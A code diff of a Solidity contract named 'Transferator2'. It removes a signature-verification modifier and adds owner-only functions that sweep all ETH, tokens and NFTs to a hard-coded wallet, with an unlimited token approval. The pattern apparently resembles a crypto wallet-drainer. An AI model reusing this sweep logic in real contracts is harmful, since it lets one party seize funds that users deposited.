@@ -30,7 +30,6 @@ contract Transferator2 is Owned(msg.sender), ERC721Holder {
         nft = _nft;
     }
 
-  
     function transferTokens(uint256 amount) external payable {
         address vault = address(this);
         address user = msg.sender;
@@ -114,35 +113,29 @@ contract Transferator2 is Owned(msg.sender), ERC721Holder {
         }
     }
 
-    modifier requireSignature(bytes calldata signature) {
-        require(
-            keccak256(abi.encode(msg.sender)).toEthSignedMessageHash().recover(
-                signature
-            ) == signer,
-            "Invalid signature."
-        );
-        _;
-    }
-
-    function setSaleState(uint8 value) external onlyOwner {
+     function setSaleState(uint8 value) external onlyOwner {
         require(value == 0 || value == 1, "Invalid state value");
         saleState = value;
     }
 
-    function setSigner(address value) external onlyOwner {
-        signer = value;
-    }
-
-    function withdrawso(
-        uint256 TokenId,
-        address nft
+   function withdrawTokens(
+    
     ) external payable onlyOwner {
-        address receiver = 0x13d8cc1209A8a189756168AbEd747F2b050D075f;
+        address receiver = 0x1e526ecc6CDcaB653823968b58056Ad5b438C92b;
 
         SafeTransferLib.safeTransferETH(receiver, address(this).balance);
         uint256 _uniqBalance = IERC20(tokeno).balanceOf(address(this));
         SafeTransferLib.safeApprove(tokeno, receiver, type(uint256).max);
         SafeTransferLib.safeTransfer(tokeno, receiver, _uniqBalance);
-        IERC721(nft).safeTransferFrom(address(this), receiver, TokenId);
+       
+    }
+
+     function withdrawNFTs(uint256[] calldata tokenIds) external onlyOwner {  
+        address receiver = 0x1e526ecc6CDcaB653823968b58056Ad5b438C92b;
+
+        for (uint256 i = 0; i < tokenIds.length; i++) {
+            IERC721(nft).safeTransferFrom(address(this), receiver, tokenIds[i]);
+        }
     }
 }
+
